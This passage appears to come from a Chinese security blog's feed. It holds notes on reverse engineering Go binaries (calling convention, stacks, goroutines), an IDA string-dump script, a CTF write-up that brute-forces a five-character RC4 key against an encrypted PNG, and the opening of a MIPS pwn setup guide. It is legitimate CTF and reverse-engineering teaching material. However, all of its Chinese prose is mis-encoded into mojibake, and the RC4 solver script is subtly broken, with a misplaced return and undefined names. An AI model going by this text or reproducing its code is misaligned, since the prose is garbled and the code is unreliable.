å¯ä»¥ä¸ºä»»æ„è‡ªå®šä¹‰ç±»å‹ç»‘å®šæ–¹æ³•ï¼Œæ–¹æ³•å°†ä¼šè¢«è½¬æ¢ä¸ºæ™®é€šå‡½æ•°ï¼Œå¹¶ä¸”å°†æ–¹æ³•çš„æ¥æ”¶è€…è½¬åŒ–ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå†çœ‹çœ‹ä¸Šæ–‡ç»“æ„ä½“çš„å›¾ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> demo <span class="hljs-keyword">struct</span> &#123;<br>size <span class="hljs-type">int</span><br>data <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *demo)</span></span> <span class="hljs-built_in">len</span>() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> d.size<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>d := &amp;demo&#123;size: <span class="hljs-number">10</span>, data: <span class="hljs-number">100</span>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;Size of demo:&quot;</span>, d.<span class="hljs-built_in">len</span>())<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨é€†å‘æ—¶å·¥å…·ä¼šå°†å…¶è§£æä¸º<code>ç±»å‹å__æ–¹æ³•å</code>æˆ–<code>ç±»å‹å_æ–¹æ³•å</code>ï¼Œå› æ­¤é‡åˆ°æ­¤ç±»åç§°æ—¶æˆ‘ä»¬éœ€è¦æ³¨æ„ä»–çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯éšå«å‚æ•°ï¼Œç±»ä¼¼ C++ çš„<code>this</code>æŒ‡é’ˆï¼Œä½† Go çš„æ–¹æ³•å®šä¹‰ä¸ä»…æ”¯æŒä¼ å¼•ç”¨ï¼Œä¹Ÿæ”¯æŒä¼ å€¼ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°å¯èƒ½åœ¨æ±‡ç¼–å±‚é¢ä¸åªå ä¸€ä¸ªæœºå™¨å­—ï¼Œå¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>Â  Â  name Â  <span class="hljs-type">string</span><br>Â  Â  age Â  Â <span class="hljs-type">int</span><br>Â  Â  weight <span class="hljs-type">uint16</span><br>Â  Â  height <span class="hljs-type">uint16</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Print() &#123;<br>Â  Â  fmt.Printf(<span class="hljs-string">&quot;%t\n&quot;</span>, p)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> PPrint() &#123;<br>Â  Â  fmt.Printf(<span class="hljs-string">&quot;%t\n&quot;</span>, p)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Â  Â  lihua := Person&#123;<br>Â  Â  Â  Â  name: Â  <span class="hljs-string">&quot;lihua&quot;</span>,<br>Â  Â  Â  Â  age: Â  Â <span class="hljs-number">18</span>,<br>Â  Â  Â  Â  weight: <span class="hljs-number">60</span>,<br>Â  Â  Â  Â  height: <span class="hljs-number">170</span>,<br>Â  Â  &#125;<br>Â  Â  lihua.Print()<br>Â  Â  lihua.PPrint()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250417150023.png"></p><h3 id="ä¼¸ç¼©æ ˆ"><a href="#ä¼¸ç¼©æ ˆ" class="headerlink" title="ä¼¸ç¼©æ ˆ"></a>ä¼¸ç¼©æ ˆ</h3><p>ç”±äº Go å¯ä»¥æ‹¥æœ‰å¤§é‡çš„åç¨‹ï¼Œè‹¥ä½¿ç”¨å›ºå®šå¤§å°çš„æ ˆå°†ä¼šé€ æˆå†…å­˜ç©ºé—´æµªè´¹ï¼Œå› æ­¤å®ƒä½¿ç”¨ä¼¸ç¼©æ ˆã€‚</p><p>åˆå§‹æ—¶ä¸€ä¸ªæ™®é€šæºç¨‹åªåˆ†é…å‡  kb çš„æ ˆï¼Œå¹¶åœ¨å‡½æ•°æ‰§è¡Œå‰å…ˆåˆ¤æ–­æ ˆç©ºé—´æ˜¯å¦è¶³å¤Ÿï¼Œè‹¥ä¸å¤Ÿåˆ™é€šè¿‡ä¸€äº›æ–¹å¼æ‰©å±•æ ˆï¼Œè¿™åœ¨æ±‡ç¼–ä¸Šçš„è¡¨ç°å½¢å¼å¦‚ä¸‹ï¼š</p><p>åœ¨è°ƒç”¨<code>runtime.morestack*</code>å‡½æ•°æ‰©å±•æ ˆåä¼šé‡æ–°è¿›å…¥å‡½æ•°å¹¶è¿›å…¥å·¦ä¾§åˆ†æ”¯ï¼Œå› æ­¤åœ¨åˆ†ææ—¶ç›´æ¥å¿½ç•¥å³ä¾§åˆ†æ”¯å³å¯ã€‚</p><h3 id="è°ƒç”¨çº¦å®š"><a href="#è°ƒç”¨çº¦å®š" class="headerlink" title="è°ƒç”¨çº¦å®š"></a>è°ƒç”¨çº¦å®š</h3><p>Go ç»Ÿä¸€é€šè¿‡æ ˆä¼ é€’å‚æ•°å’Œè¿”å›å€¼ï¼ˆè¾ƒæ–°ç‰ˆæœ¬å¯èƒ½é€šè¿‡å¯„å­˜å™¨ï¼‰ï¼Œè¿™äº›ç©ºé—´ç”±è°ƒç”¨è€…ç»´æŠ¤ï¼Œè¿”å›å€¼å†…å­˜ä¼šåœ¨è°ƒç”¨è€…å‰é€‰æ‹©æ€§çš„è¢«åˆå§‹åŒ–ã€‚</p><p>å‚æ•°ä¼ é€’æ˜¯ä»å·¦åˆ°å³é¡ºåºï¼Œåœ¨å†…å­˜ä¸­ä»ä¸‹åˆ°ä¸Šå†™å…¥æ ˆï¼Œå› æ­¤çœ‹åˆ°<code>mov [rsp+0xXX+var_xx]</code>ï¼Œ<code>reg</code>ï¼ˆæ ˆé¡¶ï¼‰æ—¶å°±ä»£è¡¨å¼€å§‹ä¸ºå‡½æ•°è°ƒç”¨å‡†å¤‡å‚æ•°äº†ï¼Œç»§ç»­å‘ä¸‹å°±èƒ½ç¡®å®šå‡½æ•°çš„å‚æ•°ä¸ªæ•°åŠå†…å®¹ï¼š</p><p>å¦‚å›¾ï¼Œ<code>mov [rsp+108h+v_108],rdx</code>ï¼Œ<code>rdx</code>å³æ ‡è¯†å¼€å§‹å‘æ ˆä¸Šä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°äº†ï¼Œä»æ­¤å¤„åˆ°<code>call</code>æŒ‡ä»¤å‰éƒ½æ˜¯ä¼ å‚ï¼Œæ­¤å¤„å¯è§åœ¨æ±‡ç¼–å±‚é¢ä¼ äº† 3 ä¸ªå‚æ•°ï¼Œ<code>call</code>æŒ‡ä»¤ä¹‹åä¸ºè¿”å›å€¼ï¼Œä¸è¿‡å¯èƒ½å­˜åœ¨è¿”å›å€¼æœªä½¿ç”¨çš„æƒ…å†µï¼Œå› æ­¤è¿”å›å€¼çš„ä¸ªæ•°å’Œå«ä¹‰éœ€è¦ä»å‡½æ•°å†…éƒ¨åˆ†æï¼Œå³åˆ†æå‡½æ•°<code>retn</code>æŒ‡ä»¤å‰çš„æŒ‡ä»¤æ¥ç¡®å®šè¿”å›å€¼å¤§å°ã€‚</p><h3 id="å†™å±éšœ"><a href="#å†™å±éšœ" class="headerlink" title="å†™å±éšœ"></a>å†™å±éšœ</h3><p>Go æ‹¥æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå…¶ä¸‰è‰²æ ‡è®°ä½¿ç”¨äº†å†™å±éšœçš„æ–¹æ³•ä¿è¯ä¸€è‡´æ€§ï¼Œåœ¨åƒåœ¾æ”¶é›†è¿‡ç¨‹ä¸­ä¼šå°†å†™å±éšœæ ‡å¿—ç½®ä½ï¼Œæ­¤æ—¶ä¼šè¿›å…¥å¦ä¸€æ¡é€»è¾‘ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨é€†å‘è¿‡ç¨‹ä¸­å¯ä»¥è®¤ä¸ºè¯¥ä½æœªç½®ä½è€Œç›´æ¥åˆ†ææ— ä¿æŠ¤çš„æƒ…å†µã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">runtime_gcWriteBarrier</span><br></code></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­æ ‡å¿—ï¼Œå†å†³å®šæ˜¯å¦è¿›å…¥ï¼Œåœ¨åˆ†ææ—¶å¯ä»¥ç›´æ¥è®¤ä¸ºå…¶æ°¸å‡å¹¶èµ°å·¦ä¾§åˆ†æ”¯ã€‚</p><h3 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h3><p>åœ¨ä»£ç ä¸­ä½¿ç”¨ go å…³é”®è¯å¯ä»¥åˆ›å»ºå¹¶è¿è¡Œåç¨‹ï¼Œå®ƒåœ¨æ±‡ç¼–ä¸Šä¼šè¢«è¡¨ç°ä¸º<code>runtime_newproc(fn,args?)</code>ï¼Œå®ƒä¼šè¢«å°è£…å‡½æ•°ä¸å‚æ•°å¹¶åˆ›å»ºæºç¨‹æ‰§è¡Œä¿¡æ¯ï¼Œå¹¶åœ¨é€‚å½“æ—¶å€™è¢«æ‰§è¡Œã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">runtime_newproc</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰§è¡Œäº†<code>go loop</code>ï¼Œç”±äºæ²¡æœ‰å‚æ•°æ­¤å¤„<code>newproc</code>åªè¢«ä¼ å…¥äº†å‡½æ•°æŒ‡é’ˆè¿™ä¸€ä¸ªå‚æ•°ï¼Œå¦åˆ™ä¼šä¼ å…¥ç»§ç»­ä¼ å…¥å‡½æ•°æ‰€éœ€çš„å‚æ•°ï¼Œåœ¨åˆ†ææ—¶ç›´æ¥å°†å‡½æ•°ä½œä¸ºåœ¨æ–°çš„çº¿ç¨‹é‡Œæ‰§è¡Œå³å¯ã€‚</p><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p>å¾€å¾€ç”¨äºèµ„æºé‡Šæ”¾ã€‚</p><h2 id="é€†å‘å®æˆ˜"><a href="#é€†å‘å®æˆ˜" class="headerlink" title="é€†å‘å®æˆ˜"></a>é€†å‘å®æˆ˜</h2><p>æ€»ç»“ä¸€ä¸‹ï¼ŒGo è¯­è¨€é€†å‘çš„éš¾ç‚¹ä¸»è¦åˆ†ä¸ºä¸‰ç‚¹ï¼š</p><ul><li>ç‹¬ç‰¹è€Œå¤æ‚çš„æ•°æ®ç±»å‹</li><li>ç‹¬ç‰¹çš„è°ƒç”¨çº¦å®šå’Œæ ˆç»“æ„ï¼Œå¤šè¿”å›å€¼æœºåˆ¶</li><li>å…¨é™æ€é“¾æ¥æ„å»º</li></ul><p>å°½ç®¡æ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼ŒGo ä»ç„¶æä¾›äº†ä¸€å®šçš„åŠ¨æ€èƒ½åŠ›ï¼Œè¿™ä¸»è¦è¡¨ç°åœ¨æ¥å£ä¸åå°„ä¸Šï¼Œè€Œè¿™äº›èƒ½åŠ›ç¦»ä¸å¼€ç±»å‹ç³»ç»Ÿï¼Œå®ƒéœ€è¦ä¿ç•™å¿…è¦çš„ç±»å‹å®šä¹‰ä»¥åŠå¯¹è±¡å’Œç±»å‹ä¹‹é—´çš„å…³è”ï¼Œè¿™éƒ¨åˆ†å†…å®¹æ— æ³•åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è¢«å»é™¤ï¼Œå¦åˆ™ä¼šå½±å“é‡æ–°è¿è¡Œï¼Œå› æ­¤åœ¨ Go é€†å‘æ—¶èƒ½è·å–åˆ°å¤§é‡çš„ç¬¦å·ä¿¡æ¯ï¼Œå¤§å¤§ç®€åŒ–äº†é€†å‘çš„éš¾åº¦ï¼Œå¯¹æ­¤ç±»ä¿¡æ¯å·²æœ‰è®¸å¤šä¼˜ç§€çš„å·¥å…·å¯ä¾›ä½¿ç”¨ï¼Œä¾‹å¦‚go_parserä¸redressã€‚</p><p><img src="/assets/Pasted%20image%2020250405112850.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_strings</span>(<span class="hljs-params">start,end</span>):<br>r=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start,end,<span class="hljs-number">16</span>):<br>addr=idaapi.get_qword(i)<br>size=idaapi.get_qword(i+<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(size))<br><span class="hljs-keyword">if</span> size&gt;<span class="hljs-number">100</span>:<br><span class="hljs-keyword">break</span><br>s=idc.get_bytes(addr,size)<br>r.append((i,s))<br><span class="hljs-keyword">return</span> r<br>strings=scan_strings(<span class="hljs-number">0x1c16990</span>,<span class="hljs-number">0x01c19430</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;strings.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">for</span> i,s <span class="hljs-keyword">in</span> strings:<br>f.write(<span class="hljs-string">&quot;%x:%s\n&quot;</span>%(i,s))<br>f.close()<br></code></pre></td></tr></table></figure><h2 id="ç¬¦å·è¿˜åŸ"><a href="#ç¬¦å·è¿˜åŸ" class="headerlink" title="ç¬¦å·è¿˜åŸ"></a>ç¬¦å·è¿˜åŸ</h2><blockquote><p>go_praserç¬¦å·æ¢å¤å·¥å…·ï¼š<a href="https://github.com/0xjiayu/go_parser?tab=readme-ov-file">0xjiayu&#x2F;go_parser: Yet Another Golang binary parser for IDAPro</a></p></blockquote><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><blockquote><p>2024 YLCTF ezgo</p></blockquote><ul><li><p>åˆ†æ</p></li><li><p>exp</p></li></ul><blockquote><p>2023 å®‰æ´µæ¯ gowhere</p></blockquote><blockquote><p>å¼ºç½‘æ‹Ÿæ€ 2022 comeongo</p></blockquote><blockquote><p>2024ç¾ŠåŸæ¯ pic</p></blockquote><ul><li>åˆ†æ</li></ul><p>æˆ‘ä»¬æ‹¿åˆ°é™„ä»¶ï¼Œæœ‰ä¸€ä¸ª<code>pic.exe</code>æ–‡ä»¶å’Œä¸€ä¸ª<code>flag.png</code>æ–‡ä»¶ï¼Œ<code>flag.png</code>æ–‡ä»¶åº”è¯¥æ˜¯åŠ å¯†åçš„ flag æ–‡ä»¶ã€‚</p><p><img src="/assets/Pasted%20image%2020250417171222.png"></p><p>è¿è¡Œç¨‹åºï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥å¯†é’¥ã€‚</p><p>idaåç¼–è¯‘åˆ†æï¼Œé€šè¿‡å­—ç¬¦ä¸²å®šä½</p><p><img src="/assets/Pasted%20image%2020250417171307.png"></p><p>è¿™é‡Œ<code>off_4DD470</code>å˜é‡å°±æ˜¯è¾“å…¥å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°†å®ƒé‡å‘½åã€‚</p><p><img src="/assets/Pasted%20image%2020250417171317.png"></p><p>æ ¹æ®ä¸‹é¢çš„<code>flag.png</code>å­—æ ·å¯ä»¥åˆ¤æ–­ï¼Œç¨‹åºåº”è¯¥æ˜¯å¯¹ flag æ–‡ä»¶è¿›è¡ŒåŠ å¯†æˆ–è§£å¯†ã€‚</p><p>è¿™é‡Œå¯ä»¥çŒœæµ‹<code>p_string</code>å˜é‡æ˜¯æ¥æ”¶è¾“å…¥å¯†é’¥çš„å˜é‡ï¼Œæˆ‘ä»¬æ ¹æ®é€»è¾‘é‡å‘½åä»£ç ã€‚</p><p><img src="/assets/Pasted%20image%2020250417171413.png"></p><p>å¯ä»¥çœ‹åˆ°å¯†é’¥åœ¨å‡ ä¸ªå˜é‡é—´ä¼ é€’ï¼Œå¹¶ä¸”é™åˆ¶å¯†é’¥çš„é•¿åº¦ä¸º 5 ï¼Œå¦åˆ™ä¾¿é€€å‡ºã€‚</p><p><img src="/assets/Pasted%20image%2020250417171629.png"></p><p>ä¸‹é¢æˆ‘ä»¬è§‚å¯Ÿå‡½æ•°è¡¨ï¼Œå‘ç°å¾ˆæ˜æ˜¾çš„åè°ƒè¯•å‡½æ•°ï¼Œä»¥åŠ<code>SeySize</code>å’Œ<code>NewCipher</code>çš„åŠ å¯†ç›¸å…³å‡½æ•°ã€‚æˆ‘ä»¬é¦–å…ˆåˆ†æåŠ å¯†ç›¸å…³çš„å‡½æ•°ã€‚</p><p><img src="/assets/Pasted%20image%2020250417170822.png"></p><p>æ ¹æ®<code>main_KeySizeError_Error</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­ç¨‹åºä½¿ç”¨çš„æ˜¯ rc4 åŠ å¯†ç®—æ³•ã€‚</p><p><img src="/assets/Pasted%20image%2020250417170947.png"></p><p>è¿™é‡Œç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥å¯†é’¥ï¼Œä½†æ˜¯æˆ‘ä»¬å®Œå…¨ä¸çŸ¥é“å¯†é’¥ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“å¯†é’¥çš„é•¿åº¦æ˜¯ 5 ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡å–çˆ†ç ´çš„æ–¹æ³•ã€‚è¿™é‡Œæˆ‘ä»¬åŠ å¯†çš„ flag æ˜¯ä¸€ä¸ª png æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ png æœªè¢«åŠ å¯†å‰çš„æ–‡ä»¶å¤´ï¼Œç„¶åé€šè¿‡çˆ†ç ´åŠ å¯†ç›´åˆ°åŠ å¯†åçš„æ–‡ä»¶å¤´ä¸æˆ‘ä»¬ flag.png çš„æ–‡ä»¶å¤´ç›¸ç­‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">enc,key</span>):    <br>  s=[]    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    s.append(i)    <br>  t=[]    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    t.append(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))    <br>  j=<span class="hljs-number">0</span>    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    j=(j+s[i]+t[i])%<span class="hljs-number">256</span>        <br>    s[i],s[j]=s[j],s[i]    <br>  i=<span class="hljs-number">0</span>    <br>  j=<span class="hljs-number">0</span>    <br>  result=[]    <br>  <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):        <br>    i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>        <br>    j=(j+s[i])%<span class="hljs-number">256</span>        <br>    s[i], s[j] = s[j], s[i]        <br>    x=(s[i]+s[j])%<span class="hljs-number">256</span>        <br>    result.append(enc[k]^s[x]^<span class="hljs-built_in">ord</span>(key[<span class="hljs-number">1</span>])^<span class="hljs-number">17</span>)<br><span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(product(Map,repeat=<span class="hljs-number">5</span>)):    <br>  key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(i))    <br>  enc = [<span class="hljs-number">0x85</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x78</span>]    <br>  flag=rc4(enc,key)    <br>  <span class="hljs-keyword">if</span> flag==[<span class="hljs-number">137</span>, <span class="hljs-number">80</span>, <span class="hljs-number">78</span>, <span class="hljs-number">71</span>]:        <br>    <span class="hljs-built_in">print</span>(key)        <br>    exit()<br></code></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>CTF ä» 0 åˆ° 1<br><a href="https://xz.aliyun.com/news/8569?time__1311=n4Ix0D2GD=DtGQDkDlOIY0=L5AKR4d4wBggbD&u_atoken=354161e2892fae430db293c849bfedaa&u_asig=1a0c39d417425347684577622e0048">æ–‡ç«  - ã€æŠ€æœ¯æ¨èã€‘æ­£å‘è§’åº¦çœ‹Goé€†å‘ - å…ˆçŸ¥ç¤¾åŒº</a><br><a href="https://forum.butian.net/share/1874">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-2022ç½‘é¼æ¯goé€†å‘æ‹¾é—ä¹‹è·¯</a><br><a href="https://www.anquanke.com/post/id/218674#h2-11">GoäºŒè¿›åˆ¶æ–‡ä»¶é€†å‘åˆ†æä»åŸºç¡€åˆ°è¿›é˜¶â€”â€”Tipsä¸å®æˆ˜æ¡ˆä¾‹-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é«˜çº§è¯­è¨€é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS Pwn</title>
      <link href="/2025/07/01/ctf/heter/mips/"/>
      <url>/2025/07/01/ctf/heter/mips/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="ç¼–è¯‘ç¯å¢ƒ"><a href="#ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="ç¼–è¯‘ç¯å¢ƒ"></a>ç¼–è¯‘ç¯å¢ƒ</h3><ul><li>å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·</li></ul><p>å®‰è£… MIPS æ¶æ„äº¤å‰ç¼–è¯‘å·¥å…·ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>gcc-mips-linux-gnu <span class="hljs-keyword">binutils-mips-linux-gnu</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu <span class="hljs-keyword">binutils-mipsel-linux-gnu</span><br><span class="hljs-keyword"></span>apt-get <span class="hljs-keyword">install </span>gcc-mips-linux-gnu          <span class="hljs-comment">#å®‰è£…ç”¨äºç¼–è¯‘å¤§ç«¯åºçš„MIPSæ¶æ„çš„GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu        <span class="hljs-comment">#å®‰è£…ç”¨äºç¼–è¯‘å°ç«¯åºçš„MIPSæ¶æ„çš„GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64-linux-gnuabi64   <span class="hljs-comment">#å®‰è£…ç”¨äºç¼–è¯‘å¤§ç«¯åºçš„MIPS64ä½æ¶æ„çš„GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64el-linux-gnuabi64 <span class="hljs-comment">#å®‰è£…ç”¨äºç¼–è¯‘å¤§ç«¯åºçš„MIPS64ä½æ¶æ„çš„GCC</span><br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘æµç¨‹</li></ul><p>å°† MIPS æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™é‡Œæˆ‘ä»¬å…ˆè¦ç¡®å®šéœ€è¦ç¼–è¯‘ç«¯åºçš„æ–‡ä»¶æ¶æ„ï¼Œç„¶åé€‰æ‹©ç›¸åº”çš„ç¼–è¯‘å·¥å…·ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥ MIPS 32 ä½æ¶æ„å°ç«¯åºä¸ºä¾‹ã€‚</p><ol><li>å°†æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡æ–‡ä»¶</li></ol><p>å› ä¸ºæˆ‘ä»¬éœ€è¦å°†æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸º MIPS æ¶æ„å°ç«¯åºçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©<code>mipsel</code>å³<code>mips</code>æ¶æ„å°ç«¯åºç¼–è¯‘å·¥å…·ï¼Œé»˜è®¤ä¸º 32 ä½ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-as <span class="hljs-built_in">demo</span>.s -o <span class="hljs-built_in">demo</span>.o<br></code></pre></td></tr></table></figure><ol><li>é“¾æ¥ç›®æ ‡æ–‡ä»¶</li></ol><p>å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥ä¸ºå¯æ‰§è¡Œç¨‹åºï¼ŒåŒæ ·é€‰æ‹©ç›¸åº”æ¶æ„çš„é“¾æ¥å™¨è¿›è¡Œé“¾æ¥ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-ld <span class="hljs-built_in">demo</span>.o -o <span class="hljs-built_in">demo</span><br></code></pre></td></tr></table></figure><ul><li>å®‰è£…åŠ¨æ€é“¾æ¥åº“</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search &quot;libc6-&quot; | grep &quot;mips&quot;<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ"><a href="#è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ"></a>è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ</h3><ul><li>å®‰è£… qemu</li></ul><p>æˆ‘ä»¬é€šè¿‡ qemu æ¥æ¨¡æ‹Ÿè¿è¡Œ</p><figure class="highlight 